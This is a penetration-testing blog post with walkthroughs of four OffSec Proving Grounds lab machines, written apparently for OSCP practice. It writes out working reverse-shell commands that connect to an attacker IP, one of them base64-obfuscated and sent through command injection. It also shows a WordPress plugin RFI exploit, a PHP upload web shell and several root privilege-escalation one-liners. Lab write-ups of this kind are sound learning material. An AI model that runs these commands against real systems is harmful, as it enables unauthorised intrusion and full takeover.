<!doctype html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7"><meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"><meta name="viewport" content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover" ><meta name="generator" content="Jekyll v4.4.1" /><meta property="og:title" content="OffSec PG - NoName, SoSimple, OnSystemShellDread, Photographer" /><meta property="og:locale" content="en" /><meta name="description" content="NoName" /><meta property="og:description" content="NoName" /><link rel="canonical" href="https://tanishq.page/blog/posts/oscp-pg-set5/" /><meta property="og:url" content="https://tanishq.page/blog/posts/oscp-pg-set5/" /><meta property="og:site_name" content="Tanishq Rupaal" /><meta property="og:image" content="https://tanishq.page/blog/assets/img/covers/pg-cover.jpeg" /><meta property="og:image:alt" content="PG Artwork" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-12-19T02:00:00-05:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://tanishq.page/blog/assets/img/covers/pg-cover.jpeg" /><meta name="twitter:image:alt" content="PG Artwork" /><meta property="twitter:title" content="OffSec PG - NoName, SoSimple, OnSystemShellDread, Photographer" /><meta name="twitter:site" content="@etheriosking" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2021-12-19T02:00:00-05:00","datePublished":"2021-12-19T02:00:00-05:00","description":"NoName","headline":"OffSec PG - NoName, SoSimple, OnSystemShellDread, Photographer","image":{"alt":"PG Artwork","url":"https://tanishq.page/blog/assets/img/covers/pg-cover.jpeg","@type":"imageObject"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://tanishq.page/blog/posts/oscp-pg-set5/"},"url":"https://tanishq.page/blog/posts/oscp-pg-set5/"}</script><title>OffSec PG - NoName, SoSimple, OnSystemShellDread, Photographer | Tanishq Rupaal</title><link rel="apple-touch-icon" sizes="180x180" href="/blog/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/blog/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/blog/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/blog/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/blog/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Tanishq Rupaal"><meta name="application-name" content="Tanishq Rupaal"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/blog/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="/blog/assets/css/jekyll-theme-chirpy.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.7.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.32.2/dist/tocbot.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/glightbox@3.3.0/dist/css/glightbox.min.css"> <script src="/blog/assets/js/dist/theme.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/glightbox@3.3.0/dist/js/glightbox.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.13/dayjs.min.js,npm/dayjs@1.11.13/locale/en.js,npm/dayjs@1.11.13/plugin/relativeTime.js,npm/dayjs@1.11.13/plugin/localizedFormat.js,npm/tocbot@4.32.2/dist/tocbot.min.js"></script> <script defer src="/blog/assets/js/dist/post.min.js"></script> <script defer src="/blog/app.min.js?baseurl=/blog&register=true" ></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-LZX7077QL4"></script> <script> document.addEventListener('DOMContentLoaded', () => { window.dataLayer = window.dataLayer || []; function gtag() { dataLayer.push(arguments); } gtag('js', new Date()); gtag('config', 'G-LZX7077QL4'); }); </script><body><aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end"><header class="profile-wrapper"> <a href="/blog/" id="avatar" class="rounded-circle"><img src="/blog/assets/Abstract.png" width="112" height="112" alt="avatar" onerror="this.style.display='none'"></a> <a class="site-title d-block" href="/blog/">Tanishq Rupaal</a><p class="site-subtitle fst-italic mb-0">Cybersecurity Professional</p></header><nav class="flex-column flex-grow-1 w-100 ps-0"><ul class="nav"><li class="nav-item"> <a href="/blog/" class="nav-link"> <i class="fa-fw fas fa-home"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/blog/categories/" class="nav-link"> <i class="fa-fw fas fa-stream"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/blog/archives/" class="nav-link"> <i class="fa-fw fas fa-archive"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/blog/tags/" class="nav-link"> <i class="fa-fw fas fa-tags"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/blog/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle"></i> <span>ABOUT</span> </a></ul></nav><div class="sidebar-bottom d-flex flex-wrap align-items-center w-100"> <button type="button" class="btn btn-link nav-link" aria-label="Switch Mode" id="mode-toggle"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/tanq16" aria-label="github" target="_blank" rel="noopener noreferrer" > <i class="fab fa-github"></i> </a> <a href="https://twitter.com/etheriosking" aria-label="twitter" target="_blank" rel="noopener noreferrer" > <i class="fab fa-twitter"></i> </a> <a href="javascript:location.href = 'mailto:' + ['dragonking47','proton.me'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="https://linkedin.com/in/tanishqrupaal" aria-label="linkedin" target="_blank" rel="noopener noreferrer" > <i class="fab fa-linkedin"></i> </a></div></aside><div id="main-wrapper" class="d-flex justify-content-center"><div class="container d-flex flex-column px-xxl-5"><header id="topbar-wrapper" class="flex-shrink-0" aria-label="Top Bar"><div id="topbar" class="d-flex align-items-center justify-content-between px-lg-3 h-100" ><nav id="breadcrumb" aria-label="Breadcrumb"> <span> <a href="/blog/">Home</a> </span> <span>OffSec PG - NoName, SoSimple, OnSystemShellDread, Photographer</span></nav><button type="button" id="sidebar-trigger" class="btn btn-link" aria-label="Sidebar"> <i class="fas fa-bars fa-fw"></i> </button><div id="topbar-title"> Post</div><button type="button" id="search-trigger" class="btn btn-link" aria-label="Search"> <i class="fas fa-search fa-fw"></i> </button> <search id="search" class="align-items-center ms-3 ms-lg-0"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..." > </search> <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">Cancel</button></div></header><div class="row flex-grow-1"><main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4"><article class="px-1" data-toc="true"><header><h1 data-toc-skip>OffSec PG - NoName, SoSimple, OnSystemShellDread, Photographer</h1><div class="post-meta text-muted"> <span> Posted <time data-ts="1639897200" data-df="ll" data-bs-toggle="tooltip" data-bs-placement="bottom" > Dec 19, 2021 </time> </span><div class="mt-3 mb-3"> <a href="/blog/assets/img/covers/pg-cover.jpeg" class="popup img-link preview-img shimmer"><img src="/blog/assets/img/covers/pg-cover.jpeg" alt="PG Artwork" width="1200" height="630" loading="lazy"></a><figcaption class="text-center pt-2 pb-2">PG Artwork</figcaption></div><div class="d-flex justify-content-between"> <span> By <em> <a href="https://twitter.com/etheriosking">Tanishq Rupaal</a> </em> </span><div> <span class="readtime" data-bs-toggle="tooltip" data-bs-placement="bottom" title="1432 words" > <em>7 min</em> read</span></div></div></div></header><div id="toc-bar" class="d-flex align-items-center justify-content-between invisible"> <span class="label text-truncate">OffSec PG - NoName, SoSimple, OnSystemShellDread, Photographer</span> <button type="button" class="toc-trigger btn me-1"> <i class="fa-solid fa-list-ul fa-fw"></i> </button></div><button id="toc-solo-trigger" type="button" class="toc-trigger btn btn-outline-secondary btn-sm"> <span class="label ps-2 pe-1">Contents</span> <i class="fa-solid fa-angle-right fa-fw"></i> </button> <dialog id="toc-popup" class="p-0"><div class="header d-flex flex-row align-items-center justify-content-between"><div class="label text-truncate py-2 ms-4">OffSec PG - NoName, SoSimple, OnSystemShellDread, Photographer</div><button id="toc-popup-close" type="button" class="btn mx-1 my-1 opacity-75"> <i class="fas fa-close"></i> </button></div><div id="toc-popup-content" class="px-4 py-3 pb-4"></div></dialog><div class="content"><h2 id="noname"><span class="me-2">NoName</span><a href="#noname" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h3 id="enumeration"><span class="me-2">Enumeration</span><a href="#enumeration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Machine IP → <code class="language-plaintext highlighter-rouge">192.168.225.15</code></p><h4 id="network-scan"><span class="me-2">Network Scan</span><a href="#network-scan" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>Nmap scan → <code class="language-plaintext highlighter-rouge">nmap -A -Pn -p- -T4 -o nmap.txt 192.168.225.15</code></p><p>OS Detection → <code class="language-plaintext highlighter-rouge">os_info</code></p><div class="table-wrapper"><table><thead><tr><th><strong>Port</strong><th><strong>Service</strong><th><strong>Other details (if any)</strong><tbody><tr><td>80<td>HTTP<td>Apache httpd 2.4.29 ((Ubuntu))</table></div><h4 id="web-scan"><span class="me-2">Web Scan</span><a href="#web-scan" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>GoBuster scan → <code class="language-plaintext highlighter-rouge">gobuster dir -u http://192.168.225.15 -f -w /home/tanq/installations/SecLists/Discovery/Web-Content/raft-small-words.txt -x html,php,txt</code></p><p>Directories/files listed →</p><ul><li>index.php<li>icons/<li>superadmin.php</ul><h3 id="exploitation"><span class="me-2">Exploitation</span><a href="#exploitation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Looking at <code class="language-plaintext highlighter-rouge">superadmin.php</code>, it seems like a ping command and thus may be vulnerable to command injection. Using <code class="language-plaintext highlighter-rouge">;</code> didn’t work, neither did <code class="language-plaintext highlighter-rouge">&amp;&amp;</code>. <code class="language-plaintext highlighter-rouge">|</code> did work and using it to print the code of the file like <code class="language-plaintext highlighter-rouge">127.0.0.1 | cat superadmin.php</code> shows that <code class="language-plaintext highlighter-rouge">";","&amp;&amp;","/","bin","&amp;"," &amp;&amp;","ls","nc","dir","pwd"</code> are all blocked.</p><p>Therefore, escaping the blocks by using</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>127.0.0.1 | `echo bmMudHJhZGl0aW9uYWwgLWUgL2Jpbi9iYXNoIDE5Mi4xNjguNDkuMjI1IDMwMDIK | base64 -d`
</pre></table></code></div></div><p>This gives a shell as the <code class="language-plaintext highlighter-rouge">www-data</code> user and thus the user flag.</p><h3 id="privilege-escalation"><span class="me-2">Privilege Escalation</span><a href="#privilege-escalation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><h4 id="user"><span class="me-2">User</span><a href="#user" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>Looking at the <code class="language-plaintext highlighter-rouge">/etc/passwd</code> file, the users of importance are <code class="language-plaintext highlighter-rouge">root</code>, <code class="language-plaintext highlighter-rouge">haclabs</code> and <code class="language-plaintext highlighter-rouge">yash</code>. Used <code class="language-plaintext highlighter-rouge">find / -type f -user yash 2&gt;/dev/null</code> to list files owned by <code class="language-plaintext highlighter-rouge">yash</code> and this prints a file <code class="language-plaintext highlighter-rouge">/usr/share/hidden/.passwd</code>. Looking at the permissions, it is world readable.</p><p>The contents of the file is a password <code class="language-plaintext highlighter-rouge">haclabs1234</code>. This works for the credentials <code class="language-plaintext highlighter-rouge">haclabs:haclabs1234</code>. This grants a shell as <code class="language-plaintext highlighter-rouge">haclabs</code> user. Looking at <code class="language-plaintext highlighter-rouge">sudo -l</code>, this user can run <code class="language-plaintext highlighter-rouge">/usr/bin/find</code> as root without any password. Thus, using the command <code class="language-plaintext highlighter-rouge">sudo find . -exec /bin/bash \; -quit</code>, a root shell can be gained. This gives the root flag.</p><hr /><h2 id="sosimple"><span class="me-2">SoSimple</span><a href="#sosimple" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h3 id="enumeration-1"><span class="me-2">Enumeration</span><a href="#enumeration-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Machine IP → <code class="language-plaintext highlighter-rouge">192.168.244.78</code></p><h4 id="network-scan-1"><span class="me-2">Network Scan</span><a href="#network-scan-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>Nmap scan → <code class="language-plaintext highlighter-rouge">nmap -A -Pn -p- -T4 -o nmap.txt 192.168.244.78</code></p><p>OS Detection → <code class="language-plaintext highlighter-rouge">OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></p><h4 id="table"><span class="me-2">Table</span><a href="#table" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div class="table-wrapper"><table><thead><tr><th><strong>Port</strong><th><strong>Service</strong><th><strong>Other details (if any)</strong><tbody><tr><td>22<td>SSH<td>OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)<tr><td>80<td>HTTP<td>Apache httpd 2.4.41 ((Ubuntu))</table></div><h4 id="web-scan-1"><span class="me-2">Web Scan</span><a href="#web-scan-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>GoBuster scan → <code class="language-plaintext highlighter-rouge">gobuster dir -u http://192.168.244.78 -f -w /home/tanq/installations/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x html,php,txt</code></p><p>Directories/files listed →</p><ul><li>index.html<li>icons/ (403)<li>wordpress/<li>server-status/ (403)</ul><p>Repeating a scan for the <code class="language-plaintext highlighter-rouge">/wordpress/</code> subdirectory, the following were listed →</p><ul><li>index.php (301)<li>wp-content/<li>wp-login.php<li>license.txt<li>wp-includes/<li>readme.html<li>wp-trackback.php<li>wp-admin (302, to wp-login.php)</ul><p>WPScan was also run given the presence of the wordpress site. This revealed the following findings →</p><ul><li>Plugin Social Warfare 3.5.0 (out of date)<li>Plugin Simple Cart Solution 0.2.0 (out of date)<li>Theme twentynineteen 1.6 (out of date)<li>Wordpress version 5.4.2<li>Enabled WP-Cron at /wordpress/wp-cron.php<li>Directory listing at /wordpress/wp-content/uploads/<li>XMLRPC enabled at /xmlrpc.php</ul><h3 id="exploitation-1"><span class="me-2">Exploitation</span><a href="#exploitation-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><h4 id="rfi-and-rce"><span class="me-2">RFI and RCE</span><a href="#rfi-and-rce" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>With all the information above, the first searchsploit result is that of an RCE in Social Warfare versions &lt; 3.5.3. Looking at the exploit, it needs a payload url to know the payload (an RFI). This will be included in <code class="language-plaintext highlighter-rouge">/wordpress/wp-admin/admin-post.php?swp_debug=load_options&amp;swp_url=&lt;RFI_URL&gt;</code>.</p><h4 id="reverse-shell"><span class="me-2">Reverse Shell</span><a href="#reverse-shell" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>Visiting this page would give the result of the command in the payload url. The payload must be of the form → <code class="language-plaintext highlighter-rouge">&lt;pre&gt;system('whoami')&lt;/pre&gt;</code>. Checking the existence of netcat and bash, a new payload can be used for a reverse shell → <code class="language-plaintext highlighter-rouge">nc -e /bin/bash 192.168.49.244 3002</code>. This didn’t work, therefore, used the usual bash payload <code class="language-plaintext highlighter-rouge">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.49.244 3002 &gt;/tmp/f</code>. This grants the shell as <code class="language-plaintext highlighter-rouge">www-data</code> user.</p><h3 id="privilege-escalation-1"><span class="me-2">Privilege Escalation</span><a href="#privilege-escalation-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><h4 id="user-1"><span class="me-2">User 1</span><a href="#user-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>Looking at <code class="language-plaintext highlighter-rouge">/etc/passwd</code>, the users of interest are <code class="language-plaintext highlighter-rouge">root</code>, <code class="language-plaintext highlighter-rouge">max</code> and <code class="language-plaintext highlighter-rouge">steven</code>. The home directory of both <code class="language-plaintext highlighter-rouge">max</code> and <code class="language-plaintext highlighter-rouge">steven</code> are readable by <code class="language-plaintext highlighter-rouge">www-data</code>. The user flag is in <code class="language-plaintext highlighter-rouge">max</code>’s home directory. The webroot also contains a base32 encoded string in a file <code class="language-plaintext highlighter-rouge">mybackup.txt</code> → <code class="language-plaintext highlighter-rouge">JEQGQYLWMUQHI3ZANNSWK4BAORUGS4ZAOBQXG43XN5ZGIIDTN5WWK53IMVZGKIDTMFTGK3DZEBRGKY3BOVZWKICJEBRWC3RHOQQHEZLNMVWWEZLSEBUXIORAN5YGK3TTMVZWC3LF</code>.</p><p>This decodes to <code class="language-plaintext highlighter-rouge">I have to keep this password somewhere safely because I can't remember it: opensesame</code>. Therefore, this password is attempted on ssh for <code class="language-plaintext highlighter-rouge">max</code> and <code class="language-plaintext highlighter-rouge">steven</code>. However, this did not work.</p><p>The home directory of <code class="language-plaintext highlighter-rouge">max</code> also has a <code class="language-plaintext highlighter-rouge">.ssh</code> directory, which contains the private key of <code class="language-plaintext highlighter-rouge">max</code>. This is readable by <code class="language-plaintext highlighter-rouge">www-data</code> and is thus used to ssh into the server as <code class="language-plaintext highlighter-rouge">max</code>, which grants the shell and thus the user flag as well.</p><h4 id="user-2"><span class="me-2">User 2</span><a href="#user-2" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>Checked the ability of <code class="language-plaintext highlighter-rouge">max</code> to run <code class="language-plaintext highlighter-rouge">sudo</code> using <code class="language-plaintext highlighter-rouge">sudo -l</code>. This allowed running <code class="language-plaintext highlighter-rouge">/usr/sbin/service</code> as <code class="language-plaintext highlighter-rouge">steven</code> without a password. The <code class="language-plaintext highlighter-rouge">service</code> command looks for services in a specific directory and launches them. It can therefore be tricked by prepending <code class="language-plaintext highlighter-rouge">../../../../</code> to whichever command needs to be executed. Therefore running →</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>sudo -u steven /usr/sbin/service ../../../../bin/bash
</pre></table></code></div></div><p>grants the shell as <code class="language-plaintext highlighter-rouge">steven</code>.</p><h4 id="root"><span class="me-2">Root</span><a href="#root" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>Looked at the ability of <code class="language-plaintext highlighter-rouge">steven</code> to run <code class="language-plaintext highlighter-rouge">sudo</code>. This revealed that <code class="language-plaintext highlighter-rouge">steven</code> is allowed to run <code class="language-plaintext highlighter-rouge">/opt/tools/server-health.sh</code> as <code class="language-plaintext highlighter-rouge">root</code> without a password. The path does not exist, therefore, a new executable is created with the same name and the following content →</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>##!/bin/bash
bash -p
</pre></table></code></div></div><p>Then command <code class="language-plaintext highlighter-rouge">sudo /opt/tools/server-health.sh</code> is executed, which grants the shell as root and also the root flag.</p><hr /><h2 id="onsystemshelldread"><span class="me-2">OnSystemShellDread</span><a href="#onsystemshelldread" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h3 id="enumeration-2"><span class="me-2">Enumeration</span><a href="#enumeration-2" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Machine IP → <code class="language-plaintext highlighter-rouge">192.168.244.130</code></p><p>Nmap scan → <code class="language-plaintext highlighter-rouge">nmap -A -Pn -p- -T4 -o nmap.txt 192.168.244.130</code></p><p>OS Detection → <code class="language-plaintext highlighter-rouge">OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</code></p><div class="table-wrapper"><table><thead><tr><th><strong>Port</strong><th><strong>Service</strong><th><strong>Other details (if any)</strong><tbody><tr><td>21<td>FTP<td>vsftpd 3.0.3 → Anonymous login allowed<tr><td>61000<td>SSH<td>OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</table></div><h3 id="exploitation-2"><span class="me-2">Exploitation</span><a href="#exploitation-2" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Looking at the anonymous ftp, there was a directory <code class="language-plaintext highlighter-rouge">.hannah</code> inside which was an ssh key. Used this key for the user <code class="language-plaintext highlighter-rouge">hannah</code> on the ssh server grants the shell as <code class="language-plaintext highlighter-rouge">hannah</code>. This gave the user flag.</p><h3 id="privilege-escalation-2"><span class="me-2">Privilege Escalation</span><a href="#privilege-escalation-2" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Looked at the setuid binaries on the system, <code class="language-plaintext highlighter-rouge">cpulimit</code> was the interesting one. It can be ised to spawn a shell with elevated privileges using command → <code class="language-plaintext highlighter-rouge">cpulimit -l 50 -f /bin/bash</code>. However, with this, the program detects that the program being run has lower privileges, so bash drops the elevated privileges. Usually, bash has a flag <code class="language-plaintext highlighter-rouge">-p</code>, the purpose of which, as stated in the man page of bash is →</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>If  the  shell is started with the effective user (group) id not equal to the
real user (group) id, and the -p option is not supplied, the effective user id
is set to the real user id. Otherwise, the effective user id is not reset.
</pre></table></code></div></div><p>Therefore, a privileged shell can be launched as follows → <code class="language-plaintext highlighter-rouge">cpulimit -l 100 -f -- /bin/sh -p</code>. This gives the root shell and thus, the root flag.</p><hr /><h2 id="photographer"><span class="me-2">Photographer</span><a href="#photographer" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h3 id="enumeration-3"><span class="me-2">Enumeration</span><a href="#enumeration-3" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Machine IP → <code class="language-plaintext highlighter-rouge">192.168.59.76</code></p><h4 id="network-scan-2"><span class="me-2">Network Scan</span><a href="#network-scan-2" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>Nmap scan → <code class="language-plaintext highlighter-rouge">nmap -A -Pn -p- -T4 -o nmap.txt 192.168.59.76</code></p><p>OS Detection → <code class="language-plaintext highlighter-rouge">OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></p><div class="table-wrapper"><table><thead><tr><th><strong>Port</strong><th><strong>Service</strong><th><strong>Other details (if any)</strong><tbody><tr><td>22<td>SSH<td>OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)<tr><td>80<td>HTTP<td>Apache httpd 2.4.18 ((Ubuntu))<tr><td>139<td>NETBIOS-SSN<td>Samba smbd 3.X - 4.X (workgroup: WORKGROUP)<tr><td>445<td>NETBIOS-SSN<td>Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)<tr><td>8000<td>HTTP-ALT<td>Apache/2.4.18 (Ubuntu)</table></div><h4 id="web-scan-2"><span class="me-2">Web Scan</span><a href="#web-scan-2" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>GoBuster scan → <code class="language-plaintext highlighter-rouge">/opt/GoBuster/gobuster dir -u http://192.168.59.76 -w /opt/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x html,php,txt</code></p><p>Directories/files listed →</p><ul><li>index.html<li>generic.html<li>elements.html<li>images/<li>assets/</ul><p>Scanning the web site on port 8000 with a <code class="language-plaintext highlighter-rouge">-x html,php,txt</code> and a <code class="language-plaintext highlighter-rouge">-f</code> flag gives the following →</p><ul><li>app/<li>admin/<li>index/<li>set/</ul><p>Running nmap to discover shares using <code class="language-plaintext highlighter-rouge">nmap --script smb-enum-shares -p 139,445 192.168.59.76</code> provided with the shares of <code class="language-plaintext highlighter-rouge">IPC</code>, <code class="language-plaintext highlighter-rouge">sambashare</code>, and <code class="language-plaintext highlighter-rouge">print</code>. This also showed the capability to read and write using anonymous users and a possible username of <code class="language-plaintext highlighter-rouge">agi</code>.</p><h3 id="exploitation-3"><span class="me-2">Exploitation</span><a href="#exploitation-3" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Listing Samba shares using <code class="language-plaintext highlighter-rouge">sambaclient -U '' //192.168.59.76/sambashare</code>. This share had an email to user <code class="language-plaintext highlighter-rouge">daisa</code> and a backup of a wordpress site. The email contained a hint to a possible password for <code class="language-plaintext highlighter-rouge">daisa</code>, using that on the website at the <code class="language-plaintext highlighter-rouge">/admin</code> path for the website at port 8000 provided access with credentials <code class="language-plaintext highlighter-rouge">daisa:babygirl</code>.</p><p>Here, the Library segment contains a file upload functionality that is interesting. Image files can be uploaded and can be previewed in the application. Messing with this functionality to upload a PHP code by changing the <code class="language-plaintext highlighter-rouge">Content-Type</code> to <code class="language-plaintext highlighter-rouge">application/php</code> and the filename to include the <code class="language-plaintext highlighter-rouge">.php</code> extension with the data containing the following code →</p><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
<span class="k">echo</span><span class="p">(</span><span class="s2">"hacked"</span><span class="p">);</span>
<span class="cp">?&gt;</span>
</pre></table></code></div></div><p>This file can be uploaded without any issue which means the server is vulnerable to arbitrary file upload. The preview for this php file doesn’t work of course, but the application shows a “Download File” option due to the failed preview. This button contains a link to the file at <code class="language-plaintext highlighter-rouge">http://192.168.59.76:8000/storage/originals/50/ce/cyberpunk.php</code>, upon visiting which the string “hacked” is displayed on the web page indicating that arbitrary php can be executed. Therefore, Pentest Monkey’s script can be used to obtain a reverse shell.</p><p>Using the script and then executing the PHP code at <code class="language-plaintext highlighter-rouge">http://192.168.59.76:8000/storage/originals/ec/a3/cyberpunk-shell.php</code> grants a shell with the user <code class="language-plaintext highlighter-rouge">www-data</code>.</p><h3 id="privilege-escalation-3"><span class="me-2">Privilege Escalation</span><a href="#privilege-escalation-3" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Looking at the SUID binaries using <code class="language-plaintext highlighter-rouge">find / -perm -4000 2&gt;/dev/null</code> there is an SUID binary for <code class="language-plaintext highlighter-rouge">php7.2</code> which does have a root shell escalation associated with it. Using <code class="language-plaintext highlighter-rouge">php7.2 -r "pcntl_exec('/bin/sh', ['-p']);"</code> to launch a shell with effective uid as root, the root flag and the local flag can be read. A new user with full sudo permissions can also be added by modifying the <code class="language-plaintext highlighter-rouge">/etc/passwd</code> and <code class="language-plaintext highlighter-rouge">/etc/sudoers</code> files.</p><hr /></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw me-1"></i> <a href="/blog/categories/lab-practice-notes/">Lab Practice Notes</a>, <a href="/blog/categories/offsec-proving-grounds/">OffSec Proving Grounds</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw me-1"></i> <a href="/blog/tags/oscp/" class="post-tag no-text-decoration" >oscp</a> <a href="/blog/tags/lab/" class="post-tag no-text-decoration" >lab</a> <a href="/blog/tags/offsec-proving-grounds/" class="post-tag no-text-decoration" >offsec-proving-grounds</a></div><div class=" post-tail-bottom d-flex justify-content-between align-items-center mt-5 pb-2 " ><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper d-flex align-items-center"> <span class="share-label text-muted">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=OffSec%20PG%20-%20NoName,%20SoSimple,%20OnSystemShellDread,%20Photographer%20-%20Tanishq%20Rupaal&url=https%3A%2F%2Ftanishq.page%2Fblog%2Fposts%2Foscp-pg-set5%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter"> <i class="fa-fw fab 